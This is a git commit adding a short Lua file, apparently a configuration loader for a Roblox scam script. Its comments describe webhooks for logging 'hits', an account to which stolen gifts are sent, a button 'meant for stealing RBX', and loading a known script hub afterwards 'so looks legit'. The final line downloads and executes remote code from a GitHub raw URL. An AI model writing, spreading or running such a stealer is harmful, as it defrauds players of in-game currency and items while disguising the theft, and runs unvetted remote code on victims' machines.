60eb08a4f6cf3e3de0189ac1ac91ba70d9007e99
ruaRaito <vano.frog2312@gmail.com>
2025-04-04 22:24:21 +0300

    Create RuaRaito.lua

---
+++ RuaRaito.lua
@@ -0,0 +1,8 @@
+LogsWebhook = "" -- << Webhook for logging hits >>
+ExecutionWebhook = "" -- << Webhook for logging executions >>
+Username = "" -- << Username of the account where gifts will be sent >>
+PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = false -- << Makes the prompt have a unique design each execution >>
+LoadRedzAfterHit = false -- << Loads redz hub after you get a hit, so looks legit >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
